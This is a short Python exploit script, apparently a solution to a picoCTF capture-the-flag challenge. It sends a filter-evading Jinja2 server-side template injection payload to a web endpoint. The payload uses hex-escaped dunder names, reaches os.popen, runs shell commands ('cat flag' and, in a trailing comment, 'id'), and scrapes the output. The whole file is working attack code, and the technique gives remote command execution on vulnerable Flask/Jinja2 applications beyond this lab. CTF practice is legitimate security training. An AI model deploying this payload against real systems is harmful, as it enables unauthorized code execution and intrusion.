import requests
import sys
from bs4 import BeautifulSoup

def main(p):
    url = f"http://shape-facility.picoctf.net:{p}/announce"
    payload = {"content":"{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}"}
    
    r = requests.post(url,data=payload)
    if r.status_code == 200:
        soup = BeautifulSoup(r.text,"html.parser")
        flag = soup.h1.text
        print(flag)

if __name__ == "__main__":
    try:
        port = sys.argv[1]
        if len(sys.argv) == 2:
            main(port)

    except (ValueError,IndexError):
        print("Usage: script.py <port>")

#payload from payloadallthethings: {{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}